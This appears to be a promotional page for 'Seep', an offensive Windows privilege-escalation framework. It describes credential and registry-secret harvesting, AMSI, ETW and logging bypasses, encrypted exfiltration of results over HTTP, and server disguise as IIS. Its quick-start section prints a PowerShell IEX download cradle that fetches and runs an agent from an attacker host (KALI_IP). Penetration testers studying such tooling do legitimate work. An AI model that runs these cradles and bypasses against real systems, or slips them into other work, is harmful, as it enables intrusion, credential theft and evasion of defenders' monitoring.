Highlights
What Seep Does
A privilege escalation enumeration framework that seeps through Windows security layers to find weaknesses.
🔍

16 Enumeration Checks

Token privileges, unquoted service paths, saved credentials, autoruns, scheduled tasks, registry secrets, DLL hijack candidates, web configs — all producing structured JSON with severity ratings.

🧰

97-Tool Catalog

Organized across 7 categories with SHA256 integrity verification and self-hosted distribution via GitHub Releases. Download, verify, and serve from one CLI.

🎯

MITRE ATT&CK Mapping

Every finding maps to ATT&CK techniques with actionable exploitation guidance, tool suggestions, example commands, and risk ratings sorted by severity.

👻

Fileless Execution

Agent runs entirely in memory via IEX cradle. Results AES-256-CBC encrypted, compressed, and uploaded over HTTP. AMSI/ETW/SBL bypassed automatically. Zero disk footprint.

📄

Single-File HTML Reports

Dark-themed, self-contained HTML — no CDN, no external requests. Executive summary, per-finding detail with evidence, and remediation guidance.

🎭

Agent Obfuscation

Cherry-pick checks with --checks / --exclude. Randomize function names, variables, HTTP headers, and check prefixes with --obfuscate.

Quick Start
Up and Running in 60 Seconds
Python on the attack box, PowerShell on the target. That's it.
# Install
$ pipx install git+https://github.com/Real-Fruit-Snacks/Seep.git

# Initialize workspace and start server
$ seep init --workdir /tmp/op1
$ seep serve --workdir /tmp/op1

# On target (server prints ready-to-use cradles with auth tokens)
PS> IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')

# Generate report
$ seep report /tmp/op1/results/results_*.json --format html -o report.html

Architecture
How It Works
Python CLI on the attack box orchestrates everything. Composed PowerShell agent runs on the target.
seep serve Target (Windows) | | | GET /agent.ps1?token=T ------------------> IEX download | | | AMSI / ETW / SBL bypass | Invoke-Seep runs (auto) | 16 checks --> JSON | | | POST /api/results <------------------ AES-256-CBC + GZip | (auth via token) | v | results/results_*.json | | | seep report --> RecommendationEngine | | | | | MITRE mapping | | Tool suggestions | v | report.html (self-contained, dark theme) |
OPSEC
Operational Security
Defense evasion built into every layer — from cradle to upload.

AMSI Bypass

Reflection-based AMSI patch in cradle and agent, obfuscated format strings.

ETW + SBL Bypass

Disables PSEtwLogProvider and patches cachedGroupPolicySettings.

Fileless by Default

IEX cradle, in-memory execution, no disk writes. Zero forensic footprint.

IIS Impersonation

Server header returns Microsoft-IIS/10.0. Benign "It works!" index page.

AES-256-CBC Transport

Results encrypted with SHA256(auth_token) key, IV prepended, then GZip compressed.

Identifier Randomization

CSPRNG-based randomization of function names, variables, headers, and check prefixes.
